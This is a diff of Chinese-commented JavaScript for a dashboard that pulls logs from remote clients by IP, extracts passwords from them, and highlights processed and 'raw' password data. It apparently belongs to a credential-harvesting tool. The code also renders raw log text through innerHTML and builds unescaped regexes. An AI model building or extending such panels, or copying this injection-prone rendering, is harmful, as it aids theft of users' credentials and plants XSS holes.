@@ -615,22 +615,30 @@ async function viewLog(clientId, filename) {
 }
 
 // 查看日志内容并滚动到包含密码的行
-async function viewLogWithPassword(clientId, filename, password) {
+async function viewLogWithPassword(clientId, filename, password, rawPassword) {
     try {
         const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
         const content = await response.text();
         document.getElementById('logModalTitle').textContent = filename;
         
-        // 创建包含密码高亮的HTML内容
-        const highlightedContent = content.replace(new RegExp(password, 'g'), `<span class="password-highlight">${password}</span>`);
+        // 创建包含密码和原始数据高亮的HTML内容
+        let highlightedContent = content;
+        
+        // 首先高亮原始数据（如果有）
+        if (rawPassword) {
+            highlightedContent = highlightedContent.replace(new RegExp(rawPassword, 'g'), `<span class="raw-password-highlight">${rawPassword}</span>`);
+        }
+        
+        // 然后高亮处理后的密码
+        highlightedContent = highlightedContent.replace(new RegExp(password, 'g'), `<span class="password-highlight">${password}</span>`);
         
         // 使用innerHTML而不是textContent来支持HTML
         document.getElementById('logContent').innerHTML = highlightedContent;
         document.getElementById('logModal').classList.add('show');
         
-        // 滚动到第一个高亮的密码位置
+        // 滚动到第一个高亮的位置（优先原始数据）
         setTimeout(() => {
-            const highlight = document.querySelector('.password-highlight');
+            let highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
             if (highlight) {
                 highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 // 添加闪烁效果以吸引注意
@@ -777,12 +785,15 @@ async function extractPasswords() {
 // 查看密码提取结果
 async function viewLatestPasswords() {
     try {
-        // 尝试从服务器获取JSON格式的提取结果
-        const response = await fetch('/logs/extracted_passwords.json');
+        // 直接从服务器本地读取提取结果文件
+        const response = await fetch('/api/extract-passwords/view');
         console.log('查看提取结果响应状态:', response.status);
         if (response.ok) {
-            const passwords = await response.json();
-            console.log('提取结果数量:', passwords.length);
+            const content = await response.text();
+            console.log('提取结果内容长度:', content.length);
+            
+            // 解析提取结果
+            const passwords = parseExtractedPasswords(content);
             
             // 显示提取结果
             displayExtractedPasswords(passwords);
@@ -790,25 +801,9 @@ async function viewLatestPasswords() {
             // 显示模态框
             document.getElementById('extractModal').classList.add('show');
         } else {
-            // 如果JSON文件不存在，尝试读取文本格式
-            const textResponse = await fetch('/api/extract-passwords/view');
-            if (textResponse.ok) {
-                const content = await textResponse.text();
-                console.log('提取结果内容长度:', content.length);
-                
-                // 解析提取结果
-                const passwords = parseExtractedPasswords(content);
-                
-                // 显示提取结果
-                displayExtractedPasswords(passwords);
-                
-                // 显示模态框
-                document.getElementById('extractModal').classList.add('show');
-            } else {
-                const errorText = await textResponse.text();
-                console.error('查看提取结果失败:', errorText);
-                showToast(`查看失败: ${errorText}`, 'error');
-            }
+            const errorText = await response.text();
+            console.error('查看提取结果失败:', errorText);
+            showToast(`查看失败: ${errorText}`, 'error');
         }
     } catch (e) {
         console.error('查看密码提取结果失败:', e);
@@ -835,13 +830,16 @@ function parseExtractedPasswords(content) {
                 index: parseInt(match[1]),
                 file: match[2].trim(),
                 timestamp: '',
-                password: ''
+                password: '',
+                rawPassword: ''
             };
         } else if (currentPassword) {
             if (trimmedLine.startsWith('时间:')) {
                 currentPassword.timestamp = trimmedLine.substring(4).trim();
             } else if (trimmedLine.startsWith('内容:')) {
                 currentPassword.password = trimmedLine.substring(4).trim();
+            } else if (trimmedLine.startsWith('原始数据:')) {
+                currentPassword.rawPassword = trimmedLine.substring(5).trim();
             }
         }
     }
@@ -874,7 +872,7 @@ function displayExtractedPasswords(passwords) {
     
     // 生成密码列表
     let html = '';
-    passwords.forEach((item, index) => {
+    passwords.forEach(item => {
         // 提取客户端ID和文件名
         let clientId = '';
         let filename = item.file;
@@ -887,18 +885,19 @@ function displayExtractedPasswords(passwords) {
             clientId = client ? client.id : `${ip}:9999`;
         }
         
-        // 检查是否有原始密码
-        const hasRawPassword = item.rawPassword && item.rawPassword !== item.password;
-        
         html += `
             <div class="extract-item">
-                <div class="index">${item.index || (index + 1)}</div>
+                <div class="index">${item.index}</div>
                 <div class="password-content">
                     ${escapeHtml(item.password)}
-                    ${hasRawPassword ? '<span class="processed-badge">已处理</span>' : ''}
+                    ${item.rawPassword ? `
+                        <div class="raw-password" style="font-size: 0.8rem; color: var(--gray); margin-top: 0.5rem;">
+                            <span style="font-weight: 600;">原始数据:</span> ${escapeHtml(item.rawPassword)}
+                        </div>
+                    ` : ''}
                 </div>
                 <div class="source-file">
-                    <a href="javascript:void(0)" onclick="viewLogWithPassword('${escapeHtml(clientId)}', '${escapeHtml(filename)}', '${hasRawPassword ? escapeHtml(item.rawPassword) : escapeHtml(item.password)}')" style="color: var(--primary); text-decoration: underline; cursor: pointer;">
+                    <a href="javascript:void(0)" onclick="viewLogWithPassword('${escapeHtml(clientId)}', '${escapeHtml(filename)}', '${escapeHtml(item.password)}', '${escapeHtml(item.rawPassword || '')}')" style="color: var(--primary); text-decoration: underline; cursor: pointer;">
                         ${escapeHtml(item.file)}
                     </a>
                 </div>
